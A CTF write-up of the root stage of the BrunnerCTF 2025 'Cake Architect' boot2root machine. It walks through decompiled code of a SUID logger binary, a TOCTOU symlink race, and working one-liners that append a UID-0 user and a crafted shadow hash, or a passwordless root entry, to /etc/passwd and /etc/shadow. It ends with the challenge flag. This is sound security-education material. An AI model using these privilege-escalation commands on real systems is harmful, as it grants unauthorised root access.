---
layout: post
title: "BrunnerCTF2025 Writeup :: Cake Architect Root"
date: 2025-08-25
categories: [Pwn, Race Condition]
tags: [writeup, boot2root, suid, pwn, root, privilege]
---


- Challenge: Cake Architect (root)
- Category: boot2root
- Difficulty: Hard

## Introduction
A **boot2root** challenge is all about a single goal: gaining **root access**. You begin with a low-privileged account and must find a way to escalate your permissions. The **flag**, which you need to complete the challenge, is only readable by the root user, so that's your ultimate target.

This specific CTF machine had two parts:

* A **web challenge** to gain your initial foothold (user shell).
* A **privilege escalation challenge** to root.

In this writeup, I’ll skip the user/web part and jump straight into the **rooting phase**.

## Hunting for SUID Binaries

Whenever I land in a limited shell on a CTF box, my first instinct is to look for **SUID binaries**.
Why? Because SUID (Set User ID) files are executed with the permissions of their owner — and if the owner is root, that’s often a golden ticket to escalation.

To search for SUID files, I ran:

```bash
find / -type f -perm -4000 2>/dev/null
```

* `/ -type f` → search all files from root.
* `-perm -4000` → specifically look for SUID files.
* `2>/dev/null` → silence permission errors.

This command is a **classic first step** in almost every boot2root, and more often than not, it will reveal something unusual left behind by the challenge creator.

And sure enough, scrolling through the results, one binary immediately caught my attention:

```bash
-rwsr-xr-x 1 root root  12345 Jan  1 12:00 /usr/local/bin/cake_logger
```

That SUID root binary was clearly **not a standard system file**, and in a CTF, that usually means: *this is the intended way in*.


## Reverse Engineering the Binary

Finding a suspicious SUID binary is only half the battle; the real work lies in figuring out how to exploit it. I downloaded the binary to my local machine for a proper analysis. It's always best to keep the target machine clean and perform the heavy lifting in your own lab.

I loaded the binary into **IDA**, Here's the code:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __uid_t v4; // [rsp+18h] [rbp-18h]
  int fd; // [rsp+1Ch] [rbp-14h]
  char *name; // [rsp+20h] [rbp-10h]
  const char *v7; // [rsp+28h] [rbp-8h]

  if ( argc > 2 && argc <= 4 )
  {
    if ( !strcmp(argv[1], "-link") )
    {
      if ( argc == 4 )
      {
        return create_recipe_link(argv[2], argv[3]) == 0;
      }
      else
      {
        fprintf(_bss_start, "Usage: %s -link <source_recipe> <link_path>\n", *argv);
        return 1;
      }
    }
    else
    {
      name = (char *)argv[1];
      v7 = argv[2];
      v4 = getuid();
      puts("Checking if you can modify the recipe...");
      if ( (unsigned int)is_owned_by_user(name, v4) )
      {
        if ( access(name, 2) )
        {
          perror("You can't write to this recipe");
          return 1;
        }
        else
        {
          puts("Looks good! Preheating oven...");
          sleep(5u);
          puts("Baking your recipe...");
          fd = open(name, 1025);
          if ( fd >= 0 )
          {
            dprintf(fd, "%s\n", v7);
            close(fd);
            puts("Recipe added successfully!");
            return 0;
          }
          else
          {
            perror("Failed to open the recipe");
            return 1;
          }
        }
      }
      else
      {
        fwrite("This recipe doesn't belong to you!\n", 1uLL, 0x23uLL, _bss_start);
        return 1;
      }
    }
  }
  else
  {
    fwrite("Usage:\n", 1uLL, 7uLL, _bss_start);
    fprintf(_bss_start, "  To add recipe: %s <recipe_file> <recipe_text>\n", *argv);
    fprintf(_bss_start, "  To create shortcut: %s -link <source_recipe> <link_path>\n", *argv);
    return 1;
  }
}
```

## Exploiting the Binary Using Race Condition

Looking deeper into the binary, a very suspicious pattern emerged. The code first checks if a file exists, then performs an action on it, but doesn't do so atomically. This is a classic **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability.

Here's a simpler way to think about it:

1.  The program **checks** if `/tmp/log` exists.
2.  The program then tries to **use** it by writing some data.

The problem? There's a small window of time between the check and the use. This tiny delay is a race window, which we can exploit.

If we can swap `/tmp/log` with a symbolic link to a different file (like `/etc/shadow`) in that brief moment, the program will write its output to our linked file instead of the intended log file. Since the program is running as **root**, we could potentially write arbitrary data to a sensitive file, like a new root password hash to `/etc/shadow`.

This is the golden ticket. The challenge creator intentionally left this race condition for us to find and exploit.


Now that I knew the binary was vulnerable to a TOCTOU race condition, I had to decide **what file I wanted to hijack**. Since the program runs with SUID-root privileges, whatever it writes to will be written as **root**.

The most straightforward and deadly idea came to mind:
👉 **append a new user to `/etc/passwd` and `/etc/shadow`.**

If I could inject my own controlled credentials into these files, I could log in as that user with full root privileges. No kernel exploits, no fancy ROP chains, just good old-fashioned privilege escalation.

But `/etc/shadow` doesn’t accept plain-text passwords; it expects a properly hashed entry. So I needed to generate one myself.

That’s where `mkpasswd` comes in handy. I ran:

```bash
mkpasswd --method=yescrypt ghost
```

This gave me a valid yescrypt hash for the password `"ghost"`.
Something like this:

```
$y$j9T$f3q8/kACKQ660FWsI5BjS1$7sMUVKVQm8EnKF3zP44z.kURpvS.5GS6HO6ukI4/Lh3
```

Now I had everything ready:

* A binary that will happily overwrite a file as root.
* A new user definition I could append to `/etc/passwd` and `/etc/shadow`.
* A working hash for the password `ghost`.


## Exploiting the Race

Now came the fun part: turning the vulnerability into a working exploit.

The idea was simple but deadly:

1. Trick the binary into believing it’s writing to a harmless file in `/tmp/`.
2. **Swap that file with a symlink** pointing to `/etc/passwd` or `/etc/shadow` *right before the write happens*.
3. Profit.

This is a textbook **TOCTOU (Time-of-Check to Time-of-Use)** attack: the program checks permissions, sleeps for a few seconds, and then writes — giving me the perfect window to swap things around.

Here’s how I pulled it off:

#### Hijack `/etc/passwd`

```bash
touch /tmp/pppp.txt; \
( sleep 1; rm /tmp/pppp.txt; /usr/local/bin/cake_logger -link /etc/passwd /tmp/pppp.txt ) & \
/usr/local/bin/cake_logger /tmp/pppp.txt "ghost:x:0:0::/root:/bin/bash"
```

Let’s break this down:

* I first created a fake file `/tmp/pppp.txt`.
* Then, in the background, I slept for 1 second, deleted the file, and replaced it with a symlink to `/etc/passwd` using the `-link` feature of the binary itself.
* Meanwhile, I launched the main write operation, appending a **new root user** called `ghost`.

The line added to `/etc/passwd` looked like this:

```
ghost:x:0:0::/root:/bin/bash
```

This basically told the system: *“Hey, here’s another root user called ghost, with `/bin/bash` as the shell.”*



#### Hijack `/etc/shadow`

Of course, the passwd entry alone wasn’t enough. I also needed a matching password entry in `/etc/shadow`.

```bash
touch /tmp/ssss.txt; \
( sleep 1; rm /tmp/ssss.txt; /usr/local/bin/cake_logger -link /etc/shadow /tmp/ssss.txt ) & \
/usr/local/bin/cake_logger /tmp/ssss.txt "ghost:$y$j9T$f3q8/kACKQ660FWsI5BjS1$7sMUVKVQm8EnKF3zP44z.kURpvS.5GS6HO6ukI4/Lh3:20323:0:99999:7:::"
```

At first glance, this looked fine. I was injecting my **crafted hash** straight into `/etc/shadow`.
But something wasn’t working. I spent nearly **three hours debugging** why login kept failing. At some point I thought maybe the hash was broken, maybe the binary was mangling things, maybe the timing was off.

Then I tested everything on my local machine. And boom, the culprit hit me in the face:


👉 **Every `$` sign in the shadow hash had to be escaped with a backslash `\`**, otherwise the binary treated it wrong and the line became corrupted.

So the correct payload had to look like this:

```bash
ghost:\$y\$j9T\$f3q8/kACKQ660FWsI5BjS1\$7sMUVKVQm8EnKF3zP44z.kURpvS.5GS6HO6ukI4/Lh3:20323:0:99999:7:::
```

Painful, but also kind of funny, the classic “one missing character ruins everything” moment.

Once I fixed that, the ghost account worked flawlessly.

## The “I’m Dumb” Realization

After all that pain of crafting hashes, escaping `$` signs, and debugging why the login wasn’t working… I realized something that made me laugh at myself.

I **didn’t even need to mess with `/etc/shadow` in the first place**.

Why? Because in `/etc/passwd`, if you just put an empty field instead of an `x`, it means the account has **no password at all**. Which means you can log in straight away without touching shadow.

So instead of:

```bash
ghost:x:0:0::/root:/bin/bash
```

I could have just added:

```bash
ghost::0:0::/root:/bin/bash
```

That’s it. No password, no hashes, no escaping `$` characters, no `/etc/shadow` injection. Just a root shell waiting for me.

At that point, I felt dumb but also relieved — sometimes the simplest path is right there in front of you, and you only notice it after hours of overcomplicating things. Classic CTF lesson.

## Conclusion - Root at Last 🏆

In the end, I definitely made things harder for myself than they needed to be. First, I went down the “let’s inject a password hash” rabbit hole, debugging `$` escaping issues for hours. Then I realized I could’ve just skipped `/etc/shadow` entirely and added a passwordless root user in `/etc/passwd`.

But you know what? Both approaches worked. And at the end of the day, **that’s the whole point of boot2root challenges**: find *any* way to escalate privileges and snatch the flag.

And finally, as `root`, I got to see that sweet treasure:

```bash
<8346bd01076ae6fc-76486c8f64-tflss:~/data$ su - ghost
ls
root.txt
cat root.txt
brunner{Wh4T_t1M3_15_15_1T?_FL4G_0_CL0CK!!}
```

